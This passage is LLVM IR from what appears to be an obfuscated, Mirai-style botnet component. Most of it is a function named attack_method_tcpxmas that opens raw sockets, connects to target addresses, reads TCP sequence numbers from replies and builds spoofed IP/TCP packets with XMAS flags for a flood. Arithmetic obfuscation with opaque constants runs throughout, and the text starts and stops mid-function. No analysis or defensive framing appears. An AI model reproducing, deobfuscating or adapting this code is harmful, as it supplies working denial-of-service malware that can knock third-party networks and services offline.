  store i32 %330, i32* %10, align 4
  br label %301

; <label>:332:                                    ; preds = %301
  br label %300
}

; Function Attrs: noinline nounwind uwtable
define signext i8 @random_hex() #0 {
  %1 = alloca [256 x i8], align 16
  %2 = alloca i32, align 4
  %3 = bitcast [256 x i8]* %1 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %3, i8* getelementptr inbounds ([256 x i8], [256 x i8]* @random_hex.hexs, i32 0, i32 0), i64 256, i32 16, i1 false)
  store i32 256, i32* %2, align 4
  %4 = call i32 @rand() #7
  %5 = load i32, i32* %2, align 4
  %6 = add i32 %5, 1313013564
  %7 = add i32 %6, 1
  %8 = sub i32 %7, 1313013564
  %9 = add nsw i32 %5, 1
  %10 = srem i32 %4, %8
  %11 = trunc i32 %10 to i8
  ret i8 %11
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #5

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #2

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #1

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) #1

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #2

declare i32 @connect(i32, %struct.sockaddr*, i32) #3

; Function Attrs: nounwind readonly
declare i64 @strlen(i8*) #6

declare i64 @send(i32, i8*, i64, i32) #3

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #5

; Function Attrs: nounwind
declare i32 @rand() #1

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcpxmas(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca %struct.attack_xmas_data*, align 8
  %12 = alloca i8**, align 8
  %13 = alloca i8, align 1
  %14 = alloca i16, align 2
  %15 = alloca i8, align 1
  %16 = alloca i8, align 1
  %17 = alloca i16, align 2
  %18 = alloca i8, align 1
  %19 = alloca i8, align 1
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i32, align 4
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca %struct.sockaddr_in, align 4
  %28 = alloca %struct.sockaddr_in, align 4
  %29 = alloca i32, align 4
  %30 = alloca [256 x i8], align 16
  %31 = alloca i64, align 8
  %32 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %33 = alloca i32, align 4
  %34 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %35 = alloca %struct.tcphdr*, align 8
  %36 = alloca %struct.iphdr*, align 8
  %37 = alloca %struct.tcphdr*, align 8
  %38 = alloca i8*, align 8
  %39 = alloca i8*, align 8
  %40 = alloca %struct.iphdr*, align 8
  %41 = alloca %struct.tcphdr*, align 8
  %42 = alloca i8*, align 8
  %43 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %44 = load i8, i8* %5, align 1
  %45 = zext i8 %44 to i64
  %46 = call noalias i8* @calloc(i64 %45, i64 16) #7
  %47 = bitcast i8* %46 to %struct.attack_xmas_data*
  store %struct.attack_xmas_data* %47, %struct.attack_xmas_data** %11, align 8
  %48 = load i8, i8* %5, align 1
  %49 = zext i8 %48 to i64
  %50 = call noalias i8* @calloc(i64 %49, i64 8) #7
  %51 = bitcast i8* %50 to i8**
  store i8** %51, i8*** %12, align 8
  %52 = load i8, i8* %7, align 1
  %53 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %54 = call i32 @attack_get_opt_int(i8 zeroext %52, %struct.attack_option* %53, i8 zeroext 2, i32 0)
  %55 = trunc i32 %54 to i8
  store i8 %55, i8* %13, align 1
  %56 = load i8, i8* %7, align 1
  %57 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %58 = call i32 @attack_get_opt_int(i8 zeroext %56, %struct.attack_option* %57, i8 zeroext 3, i32 65535)
  %59 = trunc i32 %58 to i16
  store i16 %59, i16* %14, align 2
  %60 = load i8, i8* %7, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %62 = call i32 @attack_get_opt_int(i8 zeroext %60, %struct.attack_option* %61, i8 zeroext 4, i32 64)
  %63 = trunc i32 %62 to i8
  store i8 %63, i8* %15, align 1
  %64 = load i8, i8* %7, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %66 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 5, i32 1)
  %67 = trunc i32 %66 to i8
  store i8 %67, i8* %16, align 1
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 7, i32 65535)
  %71 = trunc i32 %70 to i16
  store i16 %71, i16* %17, align 2
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 11, i32 1)
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* %18, align 1
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 12, i32 1)
  %79 = trunc i32 %78 to i8
  store i8 %79, i8* %19, align 1
  %80 = load i8, i8* %7, align 1
  %81 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %82 = call i32 @attack_get_opt_int(i8 zeroext %80, %struct.attack_option* %81, i8 zeroext 13, i32 1)
  %83 = trunc i32 %82 to i8
  store i8 %83, i8* %20, align 1
  %84 = load i8, i8* %7, align 1
  %85 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %86 = call i32 @attack_get_opt_int(i8 zeroext %84, %struct.attack_option* %85, i8 zeroext 14, i32 1)
  %87 = trunc i32 %86 to i8
  store i8 %87, i8* %21, align 1
  %88 = load i8, i8* %7, align 1
  %89 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %90 = call i32 @attack_get_opt_int(i8 zeroext %88, %struct.attack_option* %89, i8 zeroext 15, i32 1)
  %91 = trunc i32 %90 to i8
  store i8 %91, i8* %22, align 1
  %92 = load i8, i8* %7, align 1
  %93 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %94 = call i32 @attack_get_opt_int(i8 zeroext %92, %struct.attack_option* %93, i8 zeroext 16, i32 1)
  %95 = trunc i32 %94 to i8
  store i8 %95, i8* %23, align 1
  %96 = load i8, i8* %7, align 1
  %97 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %98 = call i32 @attack_get_opt_int(i8 zeroext %96, %struct.attack_option* %97, i8 zeroext 0, i32 768)
  store i32 %98, i32* %24, align 4
  %99 = load i8, i8* %7, align 1
  %100 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %101 = call i32 @attack_get_opt_int(i8 zeroext %99, %struct.attack_option* %100, i8 zeroext 1, i32 1)
  %102 = trunc i32 %101 to i8
  store i8 %102, i8* %25, align 1
  %103 = call i32 @socket(i32 2, i32 3, i32 6) #7
  store i32 %103, i32* %10, align 4
  %104 = icmp eq i32 %103, -1
  br i1 %104, label %105, label %106

; <label>:105:                                    ; preds = %4
  br label %861

; <label>:106:                                    ; preds = %4
  store i32 1, i32* %9, align 4
  %107 = load i32, i32* %10, align 4
  %108 = bitcast i32* %9 to i8*
  %109 = call i32 @setsockopt(i32 %107, i32 0, i32 3, i8* %108, i32 4) #7
  %110 = icmp eq i32 %109, -1
  br i1 %110, label %111, label %114

; <label>:111:                                    ; preds = %106
  %112 = load i32, i32* %10, align 4
  %113 = call i32 @close(i32 %112)
  br label %861

; <label>:114:                                    ; preds = %106
  store i32 0, i32* %9, align 4
  br label %115

; <label>:115:                                    ; preds = %725, %114
  %116 = load i32, i32* %9, align 4
  %117 = load i8, i8* %5, align 1
  %118 = zext i8 %117 to i32
  %119 = icmp slt i32 %116, %118
  br i1 %119, label %120, label %732

; <label>:120:                                    ; preds = %115
  br label %121

; <label>:121:                                    ; preds = %720, %706, %120
  %122 = call i32 @socket(i32 2, i32 1, i32 0) #7
  store i32 %122, i32* %26, align 4
  %123 = icmp eq i32 %122, -1
  br i1 %123, label %124, label %125

; <label>:124:                                    ; preds = %121
  br label %725

; <label>:125:                                    ; preds = %121
  %126 = load i32, i32* %26, align 4
  %127 = load i32, i32* %26, align 4
  %128 = call i32 (i32, i32, ...) @fcntl(i32 %127, i32 3, i32 0)
  %129 = xor i32 %128, -1
  %130 = xor i32 2048, -1
  %131 = xor i32 -1378734317, -1
  %132 = and i32 %129, -1378734317
  %133 = and i32 %128, %131
  %134 = and i32 %130, -1378734317
  %135 = and i32 2048, %131
  %136 = or i32 %132, %133
  %137 = or i32 %134, %135
  %138 = xor i32 %136, %137
  %139 = or i32 %129, %130
  %140 = xor i32 %139, -1
  %141 = or i32 -1378734317, %131
  %142 = and i32 %140, %141
  %143 = or i32 %138, %142
  %144 = or i32 %128, 2048
  %145 = call i32 (i32, i32, ...) @fcntl(i32 %126, i32 4, i32 %143)
  %146 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 0
  store i16 2, i16* %146, align 4
  %147 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %148 = load i32, i32* %9, align 4
  %149 = sext i32 %148 to i64
  %150 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %147, i64 %149
  %151 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %150, i32 0, i32 2
  %152 = load i8, i8* %151, align 4
  %153 = zext i8 %152 to i32
  %154 = icmp slt i32 %153, 32
  br i1 %154, label %155, label %179

; <label>:155:                                    ; preds = %125
  %156 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %157 = load i32, i32* %9, align 4
  %158 = sext i32 %157 to i64
  %159 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %156, i64 %158
  %160 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %159, i32 0, i32 1
  %161 = load i32, i32* %160, align 4
  %162 = call i32 @ntohl(i32 %161) #8
  %163 = call i32 @rand_next()
  %164 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %165 = load i32, i32* %9, align 4
  %166 = sext i32 %165 to i64
  %167 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %164, i64 %166
  %168 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %167, i32 0, i32 2
  %169 = load i8, i8* %168, align 4
  %170 = zext i8 %169 to i32
  %171 = lshr i32 %163, %170
  %172 = sub i32 %162, 546900444
  %173 = add i32 %172, %171
  %174 = add i32 %173, 546900444
  %175 = add i32 %162, %171
  %176 = call i32 @htonl(i32 %174) #8
  %177 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %178 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %177, i32 0, i32 0
  store i32 %176, i32* %178, align 4
  br label %188

; <label>:179:                                    ; preds = %125
  %180 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %181 = load i32, i32* %9, align 4
  %182 = sext i32 %181 to i64
  %183 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %180, i64 %182
  %184 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %183, i32 0, i32 1
  %185 = load i32, i32* %184, align 4
  %186 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %187 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %186, i32 0, i32 0
  store i32 %185, i32* %187, align 4
  br label %188

; <label>:188:                                    ; preds = %179, %155
  %189 = load i16, i16* %17, align 2
  %190 = zext i16 %189 to i32
  %191 = icmp eq i32 %190, 65535
  br i1 %191, label %192, label %204

; <label>:192:                                    ; preds = %188
  %193 = call i32 @rand_next()
  %194 = xor i32 %193, -1
  %195 = xor i32 65535, -1
  %196 = xor i32 540159178, -1
  %197 = or i32 %194, %195
  %198 = or i32 540159178, %196
  %199 = xor i32 %197, -1
  %200 = and i32 %199, %198
  %201 = and i32 %193, 65535
  %202 = trunc i32 %200 to i16
  %203 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  store i16 %202, i16* %203, align 2
  br label %208

; <label>:204:                                    ; preds = %188
  %205 = load i16, i16* %17, align 2
  %206 = call zeroext i16 @htons(i16 zeroext %205) #8
  %207 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  store i16 %206, i16* %207, align 2
  br label %208

; <label>:208:                                    ; preds = %204, %192
  %209 = load i32, i32* %26, align 4
  %210 = bitcast %union.__CONST_SOCKADDR_ARG* %32 to %struct.sockaddr**
  %211 = bitcast %struct.sockaddr_in* %27 to %struct.sockaddr*
  store %struct.sockaddr* %211, %struct.sockaddr** %210, align 8
  %212 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %32, i32 0, i32 0
  %213 = load %struct.sockaddr*, %struct.sockaddr** %212, align 8
  %214 = call i32 @connect(i32 %209, %struct.sockaddr* %213, i32 16)
  %215 = call i64 @time(i64* null) #7
  store i64 %215, i64* %31, align 8
  br label %216

; <label>:216:                                    ; preds = %723, %208
  store i32 16, i32* %29, align 4
  %217 = load i32, i32* %10, align 4
  %218 = getelementptr inbounds [256 x i8], [256 x i8]* %30, i32 0, i32 0
  %219 = bitcast %union.__CONST_SOCKADDR_ARG* %34 to %struct.sockaddr**
  %220 = bitcast %struct.sockaddr_in* %28 to %struct.sockaddr*
  store %struct.sockaddr* %220, %struct.sockaddr** %219, align 8
  %221 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %34, i32 0, i32 0
  %222 = load %struct.sockaddr*, %struct.sockaddr** %221, align 8
  %223 = call i64 @recvfrom(i32 %217, i8* %218, i64 256, i32 16384, %struct.sockaddr* %222, i32* %29)
  %224 = trunc i64 %223 to i32
  store i32 %224, i32* %33, align 4
  %225 = load i32, i32* %33, align 4
  %226 = icmp eq i32 %225, -1
  br i1 %226, label %227, label %228

; <label>:227:                                    ; preds = %216
  br label %861

; <label>:228:                                    ; preds = %216
  %229 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %28, i32 0, i32 2
  %230 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %229, i32 0, i32 0
  %231 = load i32, i32* %230, align 4
  %232 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %233 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %232, i32 0, i32 0
  %234 = load i32, i32* %233, align 4
  %235 = icmp eq i32 %231, %234
  br i1 %235, label %236, label %712

; <label>:236:                                    ; preds = %228
  %237 = load i32, i32* %33, align 4
  %238 = sext i32 %237 to i64
  %239 = icmp ugt i64 %238, 40
  br i1 %239, label %240, label %712

; <label>:240:                                    ; preds = %236
  %241 = getelementptr inbounds [256 x i8], [256 x i8]* %30, i32 0, i32 0
  %242 = getelementptr inbounds i8, i8* %241, i64 20
  %243 = bitcast i8* %242 to %struct.tcphdr*
  store %struct.tcphdr* %243, %struct.tcphdr** %35, align 8
  %244 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %245 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %244, i32 0, i32 0
  %246 = load i16, i16* %245, align 4
  %247 = zext i16 %246 to i32
  %248 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  %249 = load i16, i16* %248, align 2
  %250 = zext i16 %249 to i32
  %251 = icmp eq i32 %247, %250
  br i1 %251, label %252, label %711

; <label>:252:                                    ; preds = %240
  %253 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %254 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %253, i32 0, i32 4
  %255 = load i16, i16* %254, align 4
  %256 = lshr i16 %255, 9
  %257 = xor i16 1, -1
  %258 = xor i16 %256, %257
  %259 = and i16 %258, %256
  %260 = and i16 %256, 1
  %261 = zext i16 %259 to i32
  %262 = icmp ne i32 %261, 0
  br i1 %262, label %263, label %684

; <label>:263:                                    ; preds = %252
  %264 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %265 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %264, i32 0, i32 4
  %266 = load i16, i16* %265, align 4
  %267 = lshr i16 %266, 12
  %268 = xor i16 1, -1
  %269 = xor i16 %267, %268
  %270 = and i16 %269, %267
  %271 = and i16 %267, 1
  %272 = zext i16 %270 to i32
  %273 = icmp ne i32 %272, 0
  br i1 %273, label %274, label %684

; <label>:274:                                    ; preds = %263
  %275 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %276 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %275, i32 0, i32 0
  %277 = load i32, i32* %276, align 4
  %278 = load %struct.attack_xmas_data*, %struct.attack_xmas_data** %11, align 8
  %279 = load i32, i32* %9, align 4
  %280 = sext i32 %279 to i64
  %281 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %278, i64 %280
  %282 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %281, i32 0, i32 0
  store i32 %277, i32* %282, align 4
  %283 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %284 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %283, i32 0, i32 2
  %285 = load i32, i32* %284, align 4
  %286 = call i32 @ntohl(i32 %285) #8
  %287 = load %struct.attack_xmas_data*, %struct.attack_xmas_data** %11, align 8
  %288 = load i32, i32* %9, align 4
  %289 = sext i32 %288 to i64
  %290 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %287, i64 %289
  %291 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %290, i32 0, i32 1
  store i32 %286, i32* %291, align 4
  %292 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %293 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %292, i32 0, i32 3
  %294 = load i32, i32* %293, align 4
  %295 = call i32 @ntohl(i32 %294) #8
  %296 = load %struct.attack_xmas_data*, %struct.attack_xmas_data** %11, align 8
  %297 = load i32, i32* %9, align 4
  %298 = sext i32 %297 to i64
  %299 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %296, i64 %298
  %300 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %299, i32 0, i32 2
  store i32 %295, i32* %300, align 4
  %301 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %302 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %301, i32 0, i32 1
  %303 = load i16, i16* %302, align 2
  %304 = load %struct.attack_xmas_data*, %struct.attack_xmas_data** %11, align 8
  %305 = load i32, i32* %9, align 4
  %306 = sext i32 %305 to i64
  %307 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %304, i64 %306
  %308 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %307, i32 0, i32 3
  store i16 %303, i16* %308, align 4
  %309 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  %310 = load i16, i16* %309, align 2
  %311 = load %struct.attack_xmas_data*, %struct.attack_xmas_data** %11, align 8
  %312 = load i32, i32* %9, align 4
  %313 = sext i32 %312 to i64
  %314 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %311, i64 %313
  %315 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %314, i32 0, i32 4
  store i16 %310, i16* %315, align 2
  %316 = load i32, i32* %24, align 4
  %317 = sext i32 %316 to i64
  %318 = sub i64 0, 40
  %319 = sub i64 0, %317
  %320 = add i64 %318, %319
  %321 = sub i64 0, %320
  %322 = add i64 40, %317
  %323 = call noalias i8* @malloc(i64 %321) #7
  %324 = load i8**, i8*** %12, align 8
  %325 = load i32, i32* %9, align 4
  %326 = sext i32 %325 to i64
  %327 = getelementptr inbounds i8*, i8** %324, i64 %326
  store i8* %323, i8** %327, align 8
  %328 = load i8**, i8*** %12, align 8
  %329 = load i32, i32* %9, align 4
  %330 = sext i32 %329 to i64
  %331 = getelementptr inbounds i8*, i8** %328, i64 %330
  %332 = load i8*, i8** %331, align 8
  %333 = bitcast i8* %332 to %struct.iphdr*
  store %struct.iphdr* %333, %struct.iphdr** %36, align 8
  %334 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %335 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %334, i64 1
  %336 = bitcast %struct.iphdr* %335 to %struct.tcphdr*
  store %struct.tcphdr* %336, %struct.tcphdr** %37, align 8
  %337 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %338 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %337, i64 1
  %339 = bitcast %struct.tcphdr* %338 to i8*
  store i8* %339, i8** %38, align 8
  %340 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %341 = bitcast %struct.iphdr* %340 to i8*
  %342 = load i8, i8* %341, align 4
  %343 = xor i8 15, -1
  %344 = xor i8 %342, %343
  %345 = and i8 %344, %342
  %346 = and i8 %342, 15
  %347 = xor i8 %345, -1
  %348 = xor i8 64, -1
  %349 = xor i8 -21, -1
  %350 = and i8 %347, -21
  %351 = and i8 %345, %349
  %352 = and i8 %348, -21
  %353 = and i8 64, %349
  %354 = or i8 %350, %351
  %355 = or i8 %352, %353
  %356 = xor i8 %354, %355
  %357 = or i8 %347, %348
  %358 = xor i8 %357, -1
  %359 = or i8 -21, %349
  %360 = and i8 %358, %359
  %361 = or i8 %356, %360
  %362 = or i8 %345, 64
  store i8 %361, i8* %341, align 4
  %363 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %364 = bitcast %struct.iphdr* %363 to i8*
  %365 = load i8, i8* %364, align 4
  %366 = xor i8 -16, -1
  %367 = xor i8 %365, %366
  %368 = and i8 %367, %365
  %369 = and i8 %365, -16
  %370 = and i8 %368, 5
  %371 = xor i8 %368, 5
  %372 = or i8 %370, %371
  %373 = or i8 %368, 5
  store i8 %372, i8* %364, align 4
  %374 = load i8, i8* %13, align 1
  %375 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %376 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %375, i32 0, i32 1
  store i8 %374, i8* %376, align 1
  %377 = load i32, i32* %24, align 4
  %378 = sext i32 %377 to i64
  %379 = sub i64 0, %378
  %380 = sub i64 40, %379
  %381 = add i64 40, %378
  %382 = trunc i64 %380 to i16
  %383 = call zeroext i16 @htons(i16 zeroext %382) #8
  %384 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %385 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %384, i32 0, i32 2
  store i16 %383, i16* %385, align 2
  %386 = load i16, i16* %14, align 2
  %387 = call zeroext i16 @htons(i16 zeroext %386) #8
  %388 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %389 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %388, i32 0, i32 3
  store i16 %387, i16* %389, align 4
  %390 = load i8, i8* %15, align 1
  %391 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %392 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %391, i32 0, i32 5
  store i8 %390, i8* %392, align 4
  %393 = load i8, i8* %16, align 1
  %394 = icmp ne i8 %393, 0
  br i1 %394, label %395, label %399

; <label>:395:                                    ; preds = %274
  %396 = call zeroext i16 @htons(i16 zeroext 16384) #8
  %397 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %398 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %397, i32 0, i32 4
  store i16 %396, i16* %398, align 2
  br label %399

; <label>:399:                                    ; preds = %395, %274
  %400 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %401 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %400, i32 0, i32 6
  store i8 6, i8* %401, align 1
  %402 = load i32, i32* @LOCAL_ADDR, align 4
  %403 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %404 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %403, i32 0, i32 8
  store i32 %402, i32* %404, align 4
  %405 = load %struct.attack_xmas_data*, %struct.attack_xmas_data** %11, align 8
  %406 = load i32, i32* %9, align 4
  %407 = sext i32 %406 to i64
  %408 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %405, i64 %407
  %409 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %408, i32 0, i32 0
  %410 = load i32, i32* %409, align 4
  %411 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %412 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %411, i32 0, i32 9
  store i32 %410, i32* %412, align 4
  %413 = load %struct.attack_xmas_data*, %struct.attack_xmas_data** %11, align 8
  %414 = load i32, i32* %9, align 4
  %415 = sext i32 %414 to i64
  %416 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %413, i64 %415
  %417 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %416, i32 0, i32 3
  %418 = load i16, i16* %417, align 4
  %419 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %420 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %419, i32 0, i32 0
  store i16 %418, i16* %420, align 4
  %421 = load %struct.attack_xmas_data*, %struct.attack_xmas_data** %11, align 8
  %422 = load i32, i32* %9, align 4
  %423 = sext i32 %422 to i64
  %424 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %421, i64 %423
  %425 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %424, i32 0, i32 4
  %426 = load i16, i16* %425, align 2
  %427 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %428 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %427, i32 0, i32 1
  store i16 %426, i16* %428, align 2
  %429 = load %struct.attack_xmas_data*, %struct.attack_xmas_data** %11, align 8
  %430 = load i32, i32* %9, align 4
  %431 = sext i32 %430 to i64
  %432 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %429, i64 %431
  %433 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %432, i32 0, i32 2
  %434 = load i32, i32* %433, align 4
  %435 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %436 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %435, i32 0, i32 2
  store i32 %434, i32* %436, align 4
  %437 = load %struct.attack_xmas_data*, %struct.attack_xmas_data** %11, align 8
  %438 = load i32, i32* %9, align 4
  %439 = sext i32 %438 to i64
  %440 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %437, i64 %439
  %441 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %440, i32 0, i32 1
  %442 = load i32, i32* %441, align 4
  %443 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %444 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %443, i32 0, i32 3
  store i32 %442, i32* %444, align 4
  %445 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %446 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %445, i32 0, i32 4
  %447 = load i16, i16* %446, align 4
  %448 = xor i16 -241, -1
  %449 = xor i16 %447, %448
  %450 = and i16 %449, %447
  %451 = and i16 %447, -241
  %452 = and i16 %450, 128
  %453 = xor i16 %450, 128
  %454 = or i16 %452, %453
  %455 = or i16 %450, 128
  store i16 %454, i16* %446, align 4
  %456 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %457 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %456, i32 0, i32 4
  %458 = load i16, i16* %457, align 4
  %459 = xor i16 -257, -1
  %460 = xor i16 %458, %459
  %461 = and i16 %460, %458
  %462 = and i16 %458, -257
  %463 = and i16 %461, 256
  %464 = xor i16 %461, 256
  %465 = or i16 %463, %464
  %466 = or i16 %461, 256
  store i16 %465, i16* %457, align 4
  %467 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %468 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %467, i32 0, i32 4
  %469 = load i16, i16* %468, align 4
  %470 = xor i16 %469, -1
  %471 = xor i16 -4097, -1
  %472 = xor i16 27631, -1
  %473 = or i16 %470, %471
  %474 = or i16 27631, %472
  %475 = xor i16 %473, -1
  %476 = and i16 %475, %474
  %477 = and i16 %469, -4097
  %478 = xor i16 %476, -1
  %479 = xor i16 4096, -1
  %480 = xor i16 -5323, -1
  %481 = and i16 %478, -5323
  %482 = and i16 %476, %480
  %483 = and i16 %479, -5323
  %484 = and i16 4096, %480
  %485 = or i16 %481, %482
  %486 = or i16 %483, %484
  %487 = xor i16 %485, %486
  %488 = or i16 %478, %479
  %489 = xor i16 %488, -1
  %490 = or i16 -5323, %480
  %491 = and i16 %489, %490
  %492 = or i16 %487, %491
  %493 = or i16 %476, 4096
  store i16 %492, i16* %468, align 4
  %494 = call i32 @rand_next()
  %495 = xor i32 %494, -1
